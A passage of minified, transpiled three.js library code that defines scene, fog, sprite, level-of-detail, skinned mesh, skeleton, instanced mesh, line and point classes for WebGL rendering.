d=Se.getParameter(Se.UNPACK_ROW_LENGTH),p=Se.getParameter(Se.UNPACK_IMAGE_HEIGHT),h=Se.getParameter(Se.UNPACK_SKIP_PIXELS),f=Se.getParameter(Se.UNPACK_SKIP_ROWS),A=Se.getParameter(Se.UNPACK_SKIP_IMAGES),m=n.isCompressedTexture?n.mipmaps[0]:n.image;Se.pixelStorei(Se.UNPACK_ROW_LENGTH,m.width),Se.pixelStorei(Se.UNPACK_IMAGE_HEIGHT,m.height),Se.pixelStorei(Se.UNPACK_SKIP_PIXELS,e.min.x),Se.pixelStorei(Se.UNPACK_SKIP_ROWS,e.min.y),Se.pixelStorei(Se.UNPACK_SKIP_IMAGES,e.min.z),n.isDataTexture||n.isDataTexture3D?Se.texSubImage3D(a,i,t.x,t.y,t.z,o,s,l,c,u,m.data):n.isCompressedTexture?Se.compressedTexSubImage3D(a,i,t.x,t.y,t.z,o,s,l,c,m.data):Se.texSubImage3D(a,i,t.x,t.y,t.z,o,s,l,c,u,m),Se.pixelStorei(Se.UNPACK_ROW_LENGTH,d),Se.pixelStorei(Se.UNPACK_IMAGE_HEIGHT,p),Se.pixelStorei(Se.UNPACK_SKIP_PIXELS,h),Se.pixelStorei(Se.UNPACK_SKIP_ROWS,f),Se.pixelStorei(Se.UNPACK_SKIP_IMAGES,A),0===i&&r.generateMipmaps&&Se.generateMipmap(a),Z.unbindTexture()}},this.initTexture=function(e){ne.setTexture2D(e,0),Z.unbindTexture()},this.resetState=function(){k=x=0,M=null,Z.reset(),xe.reset()},"undefined"!=typeof __THREE_DEVTOOLS__&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}La.prototype.isWebGLRenderer=!0;var Oa=function(e){_inherits2(n,La);var t=_createSuper(n);function n(){return _classCallCheck2(this,n),t.apply(this,arguments)}return n}();Oa.prototype.isWebGL1Renderer=!0;var Na=function(){function e(t){var n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:25e-5;_classCallCheck2(this,e),this.name="",this.color=new $t(t),this.density=n}return _createClass2(e,[{key:"clone",value:function(){return new e(this.color,this.density)}},{key:"toJSON",value:function(){return{type:"FogExp2",color:this.color.getHex(),density:this.density}}}]),e}();Na.prototype.isFogExp2=!0;var Da=function(){function e(t){var n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1,r=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1e3;_classCallCheck2(this,e),this.name="",this.color=new $t(t),this.near=n,this.far=r}return _createClass2(e,[{key:"clone",value:function(){return new e(this.color,this.near,this.far)}},{key:"toJSON",value:function(){return{type:"Fog",color:this.color.getHex(),near:this.near,far:this.far}}}]),e}();Da.prototype.isFog=!0;var Ra=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(){var e;return _classCallCheck2(this,n),(e=t.call(this)).type="Scene",e.background=null,e.environment=null,e.fog=null,e.overrideMaterial=null,e.autoUpdate=!0,"undefined"!=typeof __THREE_DEVTOOLS__&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:_assertThisInitialized2(e)})),e}return _createClass2(n,[{key:"copy",value:function(e,t){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e,t),null!==e.background&&(this.background=e.background.clone()),null!==e.environment&&(this.environment=e.environment.clone()),null!==e.fog&&(this.fog=e.fog.clone()),null!==e.overrideMaterial&&(this.overrideMaterial=e.overrideMaterial.clone()),this.autoUpdate=e.autoUpdate,this.matrixAutoUpdate=e.matrixAutoUpdate,this}},{key:"toJSON",value:function(e){var t=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this,e);return null!==this.fog&&(t.object.fog=this.fog.toJSON()),t}}]),n}();Ra.prototype.isScene=!0;var ja=function(){function e(t,n){_classCallCheck2(this,e),this.array=t,this.stride=n,this.count=void 0!==t?t.length/n:0,this.usage=U,this.updateRange={offset:0,count:-1},this.version=0,this.uuid=q()}return _createClass2(e,[{key:"onUploadCallback",value:function(){}},{key:"setUsage",value:function(e){return this.usage=e,this}},{key:"copy",value:function(e){return this.array=new e.array.constructor(e.array),this.count=e.count,this.stride=e.stride,this.usage=e.usage,this}},{key:"copyAt",value:function(e,t,n){e*=this.stride,n*=t.stride;for(var r=0,i=this.stride;r<i;r++)this.array[e+r]=t.array[n+r];return this}},{key:"set",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return this.array.set(e,t),this}},{key:"clone",value:function(e){void 0===e.arrayBuffers&&(e.arrayBuffers={}),void 0===this.array.buffer._uuid&&(this.array.buffer._uuid=q()),void 0===e.arrayBuffers[this.array.buffer._uuid]&&(e.arrayBuffers[this.array.buffer._uuid]=this.array.slice(0).buffer);var t=new this.array.constructor(e.arrayBuffers[this.array.buffer._uuid]),n=new this.constructor(t,this.stride);return n.setUsage(this.usage),n}},{key:"onUpload",value:function(e){return this.onUploadCallback=e,this}},{key:"toJSON",value:function(e){return void 0===e.arrayBuffers&&(e.arrayBuffers={}),void 0===this.array.buffer._uuid&&(this.array.buffer._uuid=q()),void 0===e.arrayBuffers[this.array.buffer._uuid]&&(e.arrayBuffers[this.array.buffer._uuid]=Array.prototype.slice.call(new Uint32Array(this.array.buffer))),{uuid:this.uuid,buffer:this.array.buffer._uuid,type:this.array.constructor.name,stride:this.stride}}},{key:"needsUpdate",set:function(e){!0===e&&this.version++}}]),e}();ja.prototype.isInterleavedBuffer=!0;var Ua=new ye,$a=function(){function e(t,n,r){var i=3<arguments.length&&void 0!==arguments[3]&&arguments[3];_classCallCheck2(this,e),this.name="",this.data=t,this.itemSize=n,this.offset=r,this.normalized=!0===i}return _createClass2(e,[{key:"applyMatrix4",value:function(e){for(var t=0,n=this.data.count;t<n;t++)Ua.x=this.getX(t),Ua.y=this.getY(t),Ua.z=this.getZ(t),Ua.applyMatrix4(e),this.setXYZ(t,Ua.x,Ua.y,Ua.z);return this}},{key:"applyNormalMatrix",value:function(e){for(var t=0,n=this.count;t<n;t++)Ua.x=this.getX(t),Ua.y=this.getY(t),Ua.z=this.getZ(t),Ua.applyNormalMatrix(e),this.setXYZ(t,Ua.x,Ua.y,Ua.z);return this}},{key:"transformDirection",value:function(e){for(var t=0,n=this.count;t<n;t++)Ua.x=this.getX(t),Ua.y=this.getY(t),Ua.z=this.getZ(t),Ua.transformDirection(e),this.setXYZ(t,Ua.x,Ua.y,Ua.z);return this}},{key:"setX",value:function(e,t){return this.data.array[e*this.data.stride+this.offset]=t,this}},{key:"setY",value:function(e,t){return this.data.array[e*this.data.stride+this.offset+1]=t,this}},{key:"setZ",value:function(e,t){return this.data.array[e*this.data.stride+this.offset+2]=t,this}},{key:"setW",value:function(e,t){return this.data.array[e*this.data.stride+this.offset+3]=t,this}},{key:"getX",value:function(e){return this.data.array[e*this.data.stride+this.offset]}},{key:"getY",value:function(e){return this.data.array[e*this.data.stride+this.offset+1]}},{key:"getZ",value:function(e){return this.data.array[e*this.data.stride+this.offset+2]}},{key:"getW",value:function(e){return this.data.array[e*this.data.stride+this.offset+3]}},{key:"setXY",value:function(e,t,n){return e=e*this.data.stride+this.offset,this.data.array[e+0]=t,this.data.array[e+1]=n,this}},{key:"setXYZ",value:function(e,t,n,r){return e=e*this.data.stride+this.offset,this.data.array[e+0]=t,this.data.array[e+1]=n,this.data.array[e+2]=r,this}},{key:"setXYZW",value:function(e,t,n,r,i){return e=e*this.data.stride+this.offset,this.data.array[e+0]=t,this.data.array[e+1]=n,this.data.array[e+2]=r,this.data.array[e+3]=i,this}},{key:"clone",value:function(t){if(void 0!==t)return void 0===t.interleavedBuffers&&(t.interleavedBuffers={}),void 0===t.interleavedBuffers[this.data.uuid]&&(t.interleavedBuffers[this.data.uuid]=this.data.clone(t)),new e(t.interleavedBuffers[this.data.uuid],this.itemSize,this.offset,this.normalized);for(var n=[],r=0;r<this.count;r++)for(var i=r*this.data.stride+this.offset,a=0;a<this.itemSize;a++)n.push(this.data.array[i+a]);return new Qt(new this.array.constructor(n),this.itemSize,this.normalized)}},{key:"toJSON",value:function(e){if(void 0!==e)return void 0===e.interleavedBuffers&&(e.interleavedBuffers={}),void 0===e.interleavedBuffers[this.data.uuid]&&(e.interleavedBuffers[this.data.uuid]=this.data.toJSON(e)),{isInterleavedBufferAttribute:!0,itemSize:this.itemSize,data:this.data.uuid,offset:this.offset,normalized:this.normalized};for(var t=[],n=0;n<this.count;n++)for(var r=n*this.data.stride+this.offset,i=0;i<this.itemSize;i++)t.push(this.data.array[r+i]);return{itemSize:this.itemSize,type:this.array.constructor.name,array:t,normalized:this.normalized}}},{key:"count",get:function(){return this.data.count}},{key:"array",get:function(){return this.data.array}},{key:"needsUpdate",set:function(e){this.data.needsUpdate=e}}]),e}();$a.prototype.isInterleavedBufferAttribute=!0;var za,Ha=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="SpriteMaterial",r.color=new $t(16777215),r.map=null,r.alphaMap=null,r.rotation=0,r.sizeAttenuation=!0,r.transparent=!0,r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.color.copy(e.color),this.map=e.map,this.alphaMap=e.alphaMap,this.rotation=e.rotation,this.sizeAttenuation=e.sizeAttenuation,this}}]),n}();Ha.prototype.isSpriteMaterial=!0;var Va=new ye,Qa=new ye,Ga=new ye,Wa=new re,Ka=new re,qa=new Xe,Xa=new ye,Ya=new ye,Ja=new ye,Za=new re,eo=new re,to=new re,no=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(e){var r;if(_classCallCheck2(this,n),(r=t.call(this)).type="Sprite",void 0===za){za=new un;var i=new Float32Array([-.5,-.5,0,0,0,.5,-.5,0,1,0,.5,.5,0,1,1,-.5,.5,0,0,1]),a=new ja(i,5);za.setIndex([0,1,2,0,2,3]),za.setAttribute("position",new $a(a,3,0,!1)),za.setAttribute("uv",new $a(a,2,3,!1))}return r.geometry=za,r.material=void 0!==e?e:new Ha,r.center=new re(.5,.5),r}return _createClass2(n,[{key:"raycast",value:function(e,t){e.camera,Qa.setFromMatrixScale(this.matrixWorld),qa.copy(e.camera.matrixWorld),this.modelViewMatrix.multiplyMatrices(e.camera.matrixWorldInverse,this.matrixWorld),Ga.setFromMatrixPosition(this.modelViewMatrix),e.camera.isPerspectiveCamera&&!1===this.material.sizeAttenuation&&Qa.multiplyScalar(-Ga.z);var n,r,i=this.material.rotation;0!==i&&(r=Math.cos(i),n=Math.sin(i));var a=this.center;ro(Xa.set(-.5,-.5,0),Ga,a,Qa,n,r),ro(Ya.set(.5,-.5,0),Ga,a,Qa,n,r),ro(Ja.set(.5,.5,0),Ga,a,Qa,n,r),Za.set(0,0),eo.set(1,0),to.set(1,1);var o=e.ray.intersectTriangle(Xa,Ya,Ja,!1,Va);if(null!==o||(ro(Ya.set(-.5,.5,0),Ga,a,Qa,n,r),eo.set(0,1),null!==(o=e.ray.intersectTriangle(Xa,Ja,Ya,!1,Va)))){var s=e.ray.origin.distanceTo(Va);s<e.near||s>e.far||t.push({distance:s,point:Va.clone(),uv:It.getUV(Va,Xa,Ya,Ja,Za,eo,to,new re),face:null,object:this})}}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),void 0!==e.center&&this.center.copy(e.center),this.material=e.material,this}}]),n}();function ro(e,t,n,r,i,a){Wa.subVectors(e,n).addScalar(.5).multiply(r),void 0!==i?(Ka.x=a*Wa.x-i*Wa.y,Ka.y=i*Wa.x+a*Wa.y):Ka.copy(Wa),e.copy(t),e.x+=Ka.x,e.y+=Ka.y,e.applyMatrix4(qa)}no.prototype.isSprite=!0;var io=new ye,ao=new ye,oo=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(){var e;return _classCallCheck2(this,n),(e=t.call(this))._currentLevel=0,e.type="LOD",Object.defineProperties(_assertThisInitialized2(e),{levels:{enumerable:!0,value:[]},isLOD:{value:!0}}),e.autoUpdate=!0,e}return _createClass2(n,[{key:"copy",value:function(e){_get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e,!1);for(var t=e.levels,r=0,i=t.length;r<i;r++){var a=t[r];this.addLevel(a.object.clone(),a.distance)}return this.autoUpdate=e.autoUpdate,this}},{key:"addLevel",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;t=Math.abs(t);var n,r=this.levels;for(n=0;n<r.length&&!(t<r[n].distance);n++);return r.splice(n,0,{distance:t,object:e}),this.add(e),this}},{key:"getCurrentLevel",value:function(){return this._currentLevel}},{key:"getObjectForDistance",value:function(e){var t=this.levels;if(0<t.length){var n,r;for(n=1,r=t.length;n<r&&!(e<t[n].distance);n++);return t[n-1].object}return null}},{key:"raycast",value:function(e,t){if(0<this.levels.length){io.setFromMatrixPosition(this.matrixWorld);var n=e.ray.origin.distanceTo(io);this.getObjectForDistance(n).raycast(e,t)}}},{key:"update",value:function(e){var t=this.levels;if(1<t.length){io.setFromMatrixPosition(e.matrixWorld),ao.setFromMatrixPosition(this.matrixWorld);var n,r,i=io.distanceTo(ao)/e.zoom;for(t[0].object.visible=!0,n=1,r=t.length;n<r&&i>=t[n].distance;n++)t[n-1].object.visible=!1,t[n].object.visible=!0;for(this._currentLevel=n-1;n<r;n++)t[n].object.visible=!1}}},{key:"toJSON",value:function(e){var t=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this,e);!1===this.autoUpdate&&(t.object.autoUpdate=!1),t.object.levels=[];for(var r=this.levels,i=0,a=r.length;i<a;i++){var o=r[i];t.object.levels.push({object:o.object.uuid,distance:o.distance})}return t}}]),n}(),so=new ye,lo=new fe,co=new fe,uo=new ye,po=new Xe,ho=function(e){_inherits2(n,Bn);var t=_createSuper(n);function n(e,r){var i;return _classCallCheck2(this,n),(i=t.call(this,e,r)).type="SkinnedMesh",i.bindMode="attached",i.bindMatrix=new Xe,i.bindMatrixInverse=new Xe,i}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.bindMode=e.bindMode,this.bindMatrix.copy(e.bindMatrix),this.bindMatrixInverse.copy(e.bindMatrixInverse),this.skeleton=e.skeleton,this}},{key:"bind",value:function(e,t){this.skeleton=e,void 0===t&&(this.updateMatrixWorld(!0),this.skeleton.calculateInverses(),t=this.matrixWorld),this.bindMatrix.copy(t),this.bindMatrixInverse.copy(t).invert()}},{key:"pose",value:function(){this.skeleton.pose()}},{key:"normalizeSkinWeights",value:function(){for(var e=new fe,t=this.geometry.attributes.skinWeight,n=0,r=t.count;n<r;n++){e.x=t.getX(n),e.y=t.getY(n),e.z=t.getZ(n),e.w=t.getW(n);var i=1/e.manhattanLength();i!==1/0?e.multiplyScalar(i):e.set(1,0,0,0),t.setXYZW(n,e.x,e.y,e.z,e.w)}}},{key:"updateMatrixWorld",value:function(e){_get2(_getPrototypeOf(n.prototype),"updateMatrixWorld",this).call(this,e),"attached"===this.bindMode?this.bindMatrixInverse.copy(this.matrixWorld).invert():"detached"===this.bindMode&&this.bindMatrixInverse.copy(this.bindMatrix).invert()}},{key:"boneTransform",value:function(e,t){var n=this.skeleton,r=this.geometry;lo.fromBufferAttribute(r.attributes.skinIndex,e),co.fromBufferAttribute(r.attributes.skinWeight,e),so.copy(t).applyMatrix4(this.bindMatrix),t.set(0,0,0);for(var i=0;i<4;i++){var a=co.getComponent(i);if(0!==a){var o=lo.getComponent(i);po.multiplyMatrices(n.bones[o].matrixWorld,n.boneInverses[o]),t.addScaledVector(uo.copy(so).applyMatrix4(po),a)}}return t.applyMatrix4(this.bindMatrixInverse)}}]),n}();ho.prototype.isSkinnedMesh=!0;var fo=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(){var e;return _classCallCheck2(this,n),(e=t.call(this)).type="Bone",e}return n}();fo.prototype.isBone=!0;var Ao=function(e){_inherits2(n,pe);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:null,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1,o=3<arguments.length?arguments[3]:void 0,s=4<arguments.length?arguments[4]:void 0,l=5<arguments.length?arguments[5]:void 0,c=6<arguments.length?arguments[6]:void 0,u=7<arguments.length?arguments[7]:void 0,d=8<arguments.length&&void 0!==arguments[8]?arguments[8]:p,h=9<arguments.length&&void 0!==arguments[9]?arguments[9]:p,f=10<arguments.length?arguments[10]:void 0,A=11<arguments.length?arguments[11]:void 0;return _classCallCheck2(this,n),(e=t.call(this,null,l,c,u,d,h,o,s,f,A)).image={data:r,width:i,height:a},e.magFilter=d,e.minFilter=h,e.generateMipmaps=!1,e.flipY=!1,e.unpackAlignment=1,e}return n}();Ao.prototype.isDataTexture=!0;var mo=new Xe,vo=new Xe,go=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:[];_classCallCheck2(this,e),this.uuid=q(),this.bones=t.slice(0),this.boneInverses=n,this.boneMatrices=null,this.boneTexture=null,this.boneTextureSize=0,this.frame=-1,this.init()}return _createClass2(e,[{key:"init",value:function(){var e=this.bones,t=this.boneInverses;if(this.boneMatrices=new Float32Array(16*e.length),0===t.length)this.calculateInverses();else if(e.length!==t.length){this.boneInverses=[];for(var n=0,r=this.bones.length;n<r;n++)this.boneInverses.push(new Xe)}}},{key:"calculateInverses",value:function(){for(var e=this.boneInverses.length=0,t=this.bones.length;e<t;e++){var n=new Xe;this.bones[e]&&n.copy(this.bones[e].matrixWorld).invert(),this.boneInverses.push(n)}}},{key:"pose",value:function(){for(var e=0,t=this.bones.length;e<t;e++){var n=this.bones[e];n&&n.matrixWorld.copy(this.boneInverses[e]).invert()}for(var r=0,i=this.bones.length;r<i;r++){var a=this.bones[r];a&&(a.parent&&a.parent.isBone?(a.matrix.copy(a.parent.matrixWorld).invert(),a.matrix.multiply(a.matrixWorld)):a.matrix.copy(a.matrixWorld),a.matrix.decompose(a.position,a.quaternion,a.scale))}}},{key:"update",value:function(){for(var e=this.bones,t=this.boneInverses,n=this.boneMatrices,r=this.boneTexture,i=0,a=e.length;i<a;i++){var o=e[i]?e[i].matrixWorld:vo;mo.multiplyMatrices(o,t[i]),mo.toArray(n,16*i)}null!==r&&(r.needsUpdate=!0)}},{key:"clone",value:function(){return new e(this.bones,this.boneInverses)}},{key:"computeBoneTexture",value:function(){var e=Math.sqrt(4*this.bones.length);e=ee(e),e=Math.max(e,4);var t=new Float32Array(e*e*4);t.set(this.boneMatrices);var n=new Ao(t,e,e,S,_);return n.needsUpdate=!0,this.boneMatrices=t,this.boneTexture=n,this.boneTextureSize=e,this}},{key:"getBoneByName",value:function(e){for(var t=0,n=this.bones.length;t<n;t++){var r=this.bones[t];if(r.name===e)return r}}},{key:"dispose",value:function(){null!==this.boneTexture&&(this.boneTexture.dispose(),this.boneTexture=null)}},{key:"fromJSON",value:function(e,t){this.uuid=e.uuid;for(var n=0,r=e.bones.length;n<r;n++){var i=t[e.bones[n]];void 0===i&&(i=new fo),this.bones.push(i),this.boneInverses.push((new Xe).fromArray(e.boneInverses[n]))}return this.init(),this}},{key:"toJSON",value:function(){var e={metadata:{version:4.5,type:"Skeleton",generator:"Skeleton.toJSON"},bones:[],boneInverses:[]};e.uuid=this.uuid;for(var t=this.bones,n=this.boneInverses,r=0,i=t.length;r<i;r++){var a=t[r];e.bones.push(a.uuid);var o=n[r];e.boneInverses.push(o.toArray())}return e}}]),e}(),yo=function(e){_inherits2(n,Qt);var t=_createSuper(n);function n(e,r,i){var a,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:1;return _classCallCheck2(this,n),"number"==typeof i&&(o=i,i=!1),(a=t.call(this,e,r,i)).meshPerAttribute=o,a}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.meshPerAttribute=e.meshPerAttribute,this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);return e.meshPerAttribute=this.meshPerAttribute,e.isInstancedBufferAttribute=!0,e}}]),n}();yo.prototype.isInstancedBufferAttribute=!0;var bo=new Xe,_o=new Xe,wo=[],Co=new Bn,xo=function(e){_inherits2(n,Bn);var t=_createSuper(n);function n(e,r,i){var a;return _classCallCheck2(this,n),(a=t.call(this,e,r)).instanceMatrix=new yo(new Float32Array(16*i),16),a.instanceColor=null,a.count=i,a.frustumCulled=!1,a}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.instanceMatrix.copy(e.instanceMatrix),null!==e.instanceColor&&(this.instanceColor=e.instanceColor.clone()),this.count=e.count,this}},{key:"getColorAt",value:function(e,t){t.fromArray(this.instanceColor.array,3*e)}},{key:"getMatrixAt",value:function(e,t){t.fromArray(this.instanceMatrix.array,16*e)}},{key:"raycast",value:function(e,t){var n=this.matrixWorld,r=this.count;if(Co.geometry=this.geometry,Co.material=this.material,void 0!==Co.material)for(var i=0;i<r;i++){this.getMatrixAt(i,bo),_o.multiplyMatrices(n,bo),Co.matrixWorld=_o,Co.raycast(e,wo);for(var a=0,o=wo.length;a<o;a++){var s=wo[a];s.instanceId=i,s.object=this,t.push(s)}wo.length=0}}},{key:"setColorAt",value:function(e,t){null===this.instanceColor&&(this.instanceColor=new yo(new Float32Array(3*this.instanceMatrix.count),3)),t.toArray(this.instanceColor.array,3*e)}},{key:"setMatrixAt",value:function(e,t){t.toArray(this.instanceMatrix.array,16*e)}},{key:"updateMorphTargets",value:function(){}},{key:"dispose",value:function(){this.dispatchEvent({type:"dispose"})}}]),n}();xo.prototype.isInstancedMesh=!0;var So=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="LineBasicMaterial",r.color=new $t(16777215),r.linewidth=1,r.linecap="round",r.linejoin="round",r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.color.copy(e.color),this.linewidth=e.linewidth,this.linecap=e.linecap,this.linejoin=e.linejoin,this}}]),n}();So.prototype.isLineBasicMaterial=!0;var ko=new ye,Mo=new ye,Bo=new Xe,Eo=new qe,To=new $e,Po=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new un,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new So;return _classCallCheck2(this,n),(e=t.call(this)).type="Line",e.geometry=r,e.material=i,e.updateMorphTargets(),e}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.material=e.material,this.geometry=e.geometry,this}},{key:"computeLineDistances",value:function(){var e=this.geometry;if(e.isBufferGeometry){if(null===e.index){for(var t=e.attributes.position,n=[0],r=1,i=t.count;r<i;r++)ko.fromBufferAttribute(t,r-1),Mo.fromBufferAttribute(t,r),n[r]=n[r-1],n[r]+=ko.distanceTo(Mo);e.setAttribute("lineDistance",new en(n,1))}}else e.isGeometry;return this}},{key:"raycast",value:function(e,t){var n=this.geometry,r=this.matrixWorld,i=e.params.Line.threshold,a=n.drawRange;if(null===n.boundingSphere&&n.computeBoundingSphere(),To.copy(n.boundingSphere),To.applyMatrix4(r),To.radius+=i,!1!==e.ray.intersectsSphere(To)){Bo.copy(r).invert(),Eo.copy(e.ray).applyMatrix4(Bo);var o=i/((this.scale.x+this.scale.y+this.scale.z)/3),s=o*o,l=new ye,c=new ye,u=new ye,d=new ye,p=this.isLineSegments?2:1;if(n.isBufferGeometry){var h=n.index,f=n.attributes.position;if(null!==h)for(var A=Math.max(0,a.start),m=Math.min(h.count,a.start+a.count)-1;A<m;A+=p){var v=h.getX(A),g=h.getX(A+1);if(l.fromBufferAttribute(f,v),c.fromBufferAttribute(f,g),!(s<Eo.distanceSqToSegment(l,c,d,u))){d.applyMatrix4(this.matrixWorld);var y=e.ray.origin.distanceTo(d);y<e.near||y>e.far||t.push({distance:y,point:u.clone().applyMatrix4(this.matrixWorld),index:A,face:null,faceIndex:null,object:this})}}else for(var b=Math.max(0,a.start),_=Math.min(f.count,a.start+a.count)-1;b<_;b+=p)if(l.fromBufferAttribute(f,b),c.fromBufferAttribute(f,b+1),!(s<Eo.distanceSqToSegment(l,c,d,u))){d.applyMatrix4(this.matrixWorld);var w=e.ray.origin.distanceTo(d);w<e.near||w>e.far||t.push({distance:w,point:u.clone().applyMatrix4(this.matrixWorld),index:b,face:null,faceIndex:null,object:this})}}else n.isGeometry}}},{key:"updateMorphTargets",value:function(){var e=this.geometry;if(e.isBufferGeometry){var t=e.morphAttributes,n=Object.keys(t);if(0<n.length){var r=t[n[0]];if(void 0!==r){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(var i=0,a=r.length;i<a;i++){var o=r[i].name||String(i);this.morphTargetInfluences.push(0),this.morphTargetDictionary[o]=i}}}}else{var s=e.morphTargets;void 0!==s&&s.length}}}]),n}();Po.prototype.isLine=!0;var Io=new ye,Fo=new ye,Lo=function(e){_inherits2(n,Po);var t=_createSuper(n);function n(e,r){var i;return _classCallCheck2(this,n),(i=t.call(this,e,r)).type="LineSegments",i}return _createClass2(n,[{key:"computeLineDistances",value:function(){var e=this.geometry;if(e.isBufferGeometry){if(null===e.index){for(var t=e.attributes.position,n=[],r=0,i=t.count;r<i;r+=2)Io.fromBufferAttribute(t,r),Fo.fromBufferAttribute(t,r+1),n[r]=0===r?0:n[r-1],n[r+1]=n[r]+Io.distanceTo(Fo);e.setAttribute("lineDistance",new en(n,1))}}else e.isGeometry;return this}}]),n}();Lo.prototype.isLineSegments=!0;var Oo=function(e){_inherits2(n,Po);var t=_createSuper(n);function n(e,r){var i;return _classCallCheck2(this,n),(i=t.call(this,e,r)).type="LineLoop",i}return n}();Oo.prototype.isLineLoop=!0;var No=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="PointsMaterial",r.color=new $t(16777215),r.map=null,r.alphaMap=null,r.size=1,r.sizeAttenuation=!0,r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.color.copy(e.color),this.map=e.map,this.alphaMap=e.alphaMap,this.size=e.size,this.sizeAttenuation=e.sizeAttenuation,this}}]),n}();No.prototype.isPointsMaterial=!0;var Do=new Xe,Ro=new qe,jo=new $e,Uo=new ye,$o=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new un,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new No;return _classCallCheck2(this,n),(e=t.call(this)).type="Points",e.geometry=r,e.material=i,e.updateMorphTargets(),e}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.material=e.material,this.geometry=e.geometry,this}},{key:"raycast",value:function(e,t){var n=this.geometry,r=this.matrixWorld,i=e.params.Points.threshold,a=n.drawRange;if(null===n.boundingSphere&&n.computeBoundingSphere(),jo.copy(n.boundingSphere),jo.applyMatrix4(r),jo.radius+=i,!1!==e.ray.intersectsSphere(jo)){Do.copy(r).invert(),Ro.copy(e.ray).applyMatrix4(Do);var o=i/((this.scale.x+this.scale.y+this.scale.z)/3),s=o*o;if(n.isBufferGeometry){var l=n.index,c=n.attributes.position;if(null!==l)for(var u=Math.max(0,a.start),d=Math.min(l.count,a.start+a.count);u<d;u++){var p=l.getX(u);Uo.fromBufferAttribute(c,p),zo(Uo,p,s,r,e,t,this)}else for(var h=Math.max(0,a.start),f=Math.min(c.count,a.start+a.count);h<f;h++)Uo.fromBufferAttribute(c,h),zo(Uo,h,s,r,e,t,this)}}}},{key:"updateMorphTargets",value:function(){var e=this.geometry;if(e.isBufferGeometry){var t=e.morphAttributes,n=Object.keys(t);if(0<n.length){var r=t[n[0]];if(void 0!==r){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(var i=0,a=r.length;i<a;i++){var o=r[i].name||String(i);this.morphTargetInfluences.push(0),this.morphTargetDictionary[o]=i}}}}else{var s=e.morphTargets;void 0!==s&&s.length}}}]),n}();function zo(e,t,n,r,i,a,o){var s=Ro.distanceSqToPoint(e);if(s<n){var l=new ye;Ro.closestPointToPoint(e,l),l.applyMatrix4(r);var c=i.ray.origin.distanceTo(l);if(c<i.near||c>i.far)return;a.push({distance:c,distanceToRay:Math.sqrt(s),point:l,index:t,face:null,object:o})}}$o.prototype.isPoints=!0;var Ho=function(e){_inherits2(n,pe);var t=_createSuper(n);function n(e,r,i,a,o,s,l,c,u){var d;_classCallCheck2(this,n),(d=t.call(this,e,r,i,a,o,s,l,c,u)).format=void 0!==l?l:x,d.minFilter=void 0!==s?s:A,d.magFilter=void 0!==o?o:A,d.generateMipmaps=!1;var p=_assertThisInitialized2(d);return"requestVideoFrameCallback"in e&&e.requestVideoFrameCallback((function t(){p.needsUpdate=!0,e.requestVideoFrameCallback(t)})),d}return _createClass2(n,[{key:"clone",value:function(){return new this.constructor(this.image).copy(this)}},{key:"update",value:function(){var e=this.image;!1=="requestVideoFrameCallback"in e&&e.readyState>=e.HAVE_CURRENT_DATA&&(this.needsUpdate=!0)}}]),n}();Ho.prototype.isVideoTexture=!0;var Vo=function(e){_inherits2(n,pe);var t=_createSuper(n);function n(e,r,i){var a;return _classCallCheck2(this,n),(a=t.call(this,{width:e,height:r})).format=i,a.magFilter=p,a.minFilter=p,a.generateMipmaps=!1,a.needsUpdate=!0,a}return n}();Vo.prototype.isFramebufferTexture=!0;var 